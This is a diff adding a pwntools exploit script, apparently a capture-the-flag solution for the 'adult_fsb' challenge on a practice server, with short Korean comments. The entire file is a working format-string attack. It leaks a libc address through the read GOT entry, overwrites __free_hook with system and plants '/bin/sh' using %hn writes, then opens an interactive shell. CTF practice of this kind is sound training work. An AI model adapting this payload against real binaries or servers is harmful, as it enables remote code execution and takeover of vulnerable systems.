@@ -1,0 +1,84 @@
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+r = remote("ctf.j0n9hyun.xyz", 3040)
+# r = process("./adultfsb/adult_fsb")
+
+lib = ELF("./adultfsb/libc.so.6")
+
+# https://baobob1024.tistory.com/173
+
+
+
+read_got = 0x600fd8
+
+# libc leak
+# 8번째부터 입력한 값 출력
+
+payload  = b""
+payload += b"%10$s"
+payload = payload.ljust(0x10, b"a")
+payload += p64(read_got)
+pause()
+r.sendline(payload)
+pause()
+
+libc = u64(r.recvuntil("a")[:-1].ljust(8, b"\x00"))
+
+
+
+system = libc + lib.symbols['system'] - lib.symbols['read']
+free_hook = libc + lib.symbols['__free_hook'] - lib.symbols['read']
+initial = libc + lib.symbols['__abort_msg'] + 0x60 - lib.symbols['read']
+
+
+# system의 주소를 __free_hook에 overwrite
+# cur->next overwrite +0 -> /bin/sh;
+# cur->idx overwrite +8 -> 0
+
+binsh = bytes_to_long(b"/bin/sh"[::-1])
+l = []
+# free_hook 4등분
+for i in range(4):
+    l.append([(system >> (16*i)) & 0xffff, free_hook + 2*i])
+    l.append([(binsh >> (16*i)) & 0xffff, initial + 2*i])
+    
+l.sort()
+# initial 4등분
+
+
+print("free_hook: " + hex(free_hook))
+print("system: " + hex(system))
+print("initial: " + hex(initial))
+print("binsh: " + hex(binsh))
+
+# 8번째부터 시작
+payload  = b""
+payload += b"%22$ln"
+
+for i in range(8):
+    if i == 0:
+        
+        payload += b"%"
+        payload += b"%d"%(23+i)
+        payload += b"$hn"
+    else:
+        payload += b"%%%d"%(l[i][0] - l[i-1][0])
+        payload += b"c%"
+        payload += b"%d"%(23+i)
+        payload += b"$hn"
+
+
+payload = payload.ljust(0x70, b"a")
+payload += p64(initial + 8)
+
+for i in range(8):
+    payload += p64(l[i][1])
+
+print(l)
+print(payload)
+pause()
+r.sendline(payload)
+pause()
+
+r.interactive()
